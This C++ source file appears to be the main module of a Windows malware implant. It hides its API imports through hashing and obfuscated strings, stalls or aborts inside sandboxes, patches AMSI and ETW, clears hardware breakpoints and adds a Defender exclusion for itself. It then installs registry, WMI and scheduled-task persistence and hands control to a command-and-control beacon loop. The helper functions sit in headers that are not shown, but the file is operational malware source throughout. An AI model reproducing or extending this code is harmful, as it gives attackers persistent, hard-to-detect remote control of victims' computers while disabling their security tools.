#include <windows.h>
#include "syscalls.hpp"
#include "evasion.hpp"
#include "c2.hpp"
#include "utils.hpp"
#include "persistence.hpp"
#include "injection.hpp"
#include "obfuscate.hpp"

// NtDelayExecution inline helper — no Sleep() in IAT
static void NtSleep(DWORD ms) {
    typedef NTSTATUS (NTAPI *NtDelayExecution_t)(BOOLEAN, PLARGE_INTEGER);
    static NtDelayExecution_t pfn = nullptr;
    if (!pfn) {
        HMODULE h = GetModuleHandleA(XS("ntdll.dll"));
        pfn = reinterpret_cast<NtDelayExecution_t>(
            HashProc(h, FNV("NtDelayExecution")));
    }
    if (pfn) {
        LARGE_INTEGER li;
        li.QuadPart = -static_cast<LONGLONG>(ms) * 10000LL;
        pfn(FALSE, &li);
    }
}

// Decoy compute loop — looks like legitimate work to a sandbox timer
static void DecoyLoop() {
    volatile unsigned long long fib = 1, a = 0, b = 1;
    for (int i = 0; i < 5000000; i++) { fib = a + b; a = b; b = fib; }
}

DWORD WINAPI ImplantThread(LPVOID) {
    // Anti-sandbox: decoy compute first, then uptime/CPUID check
    DecoyLoop();
    if (SandboxCheck()) {
        NtSleep(600000); // 10 min stall — outlast sandbox timeout
        return 0;
    }

    // Loop InitializeSyscalls until success — EDR may delay ntdll mapping
    while (!InitializeSyscalls()) {
        NtSleep(5000);
    }

    // Apply initial evasion
    PatchAMSI();
    PatchETW();
    ClearHardwareBreakpoints();

    wchar_t exePath[MAX_PATH] = {};
    GetModuleFileNameW(NULL, exePath, MAX_PATH);

    if (IsElevated()) {
        AddDefenderExclusion(exePath);
    }

    // Install all persistence mechanisms — registry is a fast fallback
    // that doesn't require WMI and survives partial cleanups.
    InstallRegistryPersistence(exePath);
    if (!IsWmiPersistenceInstalled()) {
        InstallWmiPersistence(exePath);
    }
    if (!IsScheduledTaskInstalled()) {
        InstallScheduledTaskPersistence(exePath);
    }

    // Enter C2 beacon loop — returns only on clean "exit" command
    BeaconLoop();

    return 0;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    SetErrorMode(SEM_NOGPFAULTERRORBOX | SEM_FAILCRITICALERRORS);

    auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
    if (!hKernel32) return 0;

    auto _CreateThread        = HASHPROC(hKernel32, CreateThread);
    auto _WaitForSingleObject = HASHPROC(hKernel32, WaitForSingleObject);
    auto _CloseHandle         = HASHPROC(hKernel32, CloseHandle);
    if (!_CreateThread || !_WaitForSingleObject || !_CloseHandle) return 0;

    HANDLE hThread = _CreateThread(NULL, 0, ImplantThread, NULL, 0, NULL);
    if (!hThread) return 0;

    // Block until ImplantThread exits (either SandboxCheck abort or clean
    // "exit" command from operator).  Avoids the zombie spin-loop and lets
    // the process exit cleanly — no artifact threads left behind.
    _WaitForSingleObject(hThread, INFINITE);
    _CloseHandle(hThread);

    return 0;
}